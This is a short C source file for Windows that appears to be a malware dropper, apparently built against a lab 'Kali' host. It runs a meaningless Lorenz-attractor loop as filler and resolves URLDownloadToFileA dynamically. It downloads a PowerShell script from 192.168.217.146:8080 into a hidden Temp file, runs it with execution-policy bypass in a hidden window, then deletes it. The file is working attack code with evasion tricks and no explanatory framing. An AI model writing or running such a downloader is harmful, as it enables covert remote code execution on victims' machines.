#include <windows.h>

/* Lorenz */
static double lx=1.0,ly=1.0,lz=1.0;
static void ls(){double dt=0.01,dx=10.0*(ly-lx)*dt,dy=(lx*(28.0-lz)-ly)*dt,dz=(lx*ly-2.667*lz)*dt;lx+=dx;ly+=dy;lz+=dz;}

int WINAPI WinMain(HINSTANCE h,HINSTANCE p,LPSTR c,int s){
    for(int i=0;i<50;i++)ls();

    /* Write PS1 script */
    HANDLE f=CreateFileA("C:\\Windows\\Temp\\perf_mod.ps1",
        GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN,NULL);
    if(f==INVALID_HANDLE_VALUE)return 1;

    /* Download and write script content from Kali */
    /* Use URLDownloadToFile */
    CloseHandle(f);

    HMODULE m=LoadLibraryA("urlmon.dll");
    if(m){
        typedef HRESULT(WINAPI*pF)(LPUNKNOWN,LPCSTR,LPCSTR,DWORD,LPBINDSTATUSCALLBACK);
        pF fn=(pF)GetProcAddress(m,"URLDownloadToFileA");
        if(fn){
            /* Download PS1 script */
            char url[]="http://192.168.217.146:8080/output/sg_setup.ps1";
            char dst[]="C:\\Windows\\Temp\\perf_mod.ps1";
            fn(NULL,url,dst,0,NULL);
        }
        FreeLibrary(m);
    }

    /* Run PS1 */
    STARTUPINFOA si={sizeof(si)};PROCESS_INFORMATION pi={0};
    si.dwFlags=STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;
    char cmd[]="powershell.exe -ep bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\perf_mod.ps1";
    CreateProcessA("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        cmd,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(pi.hProcess){WaitForSingleObject(pi.hProcess,60000);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}

    DeleteFileA("C:\\Windows\\Temp\\perf_mod.ps1");
    return 0;
}
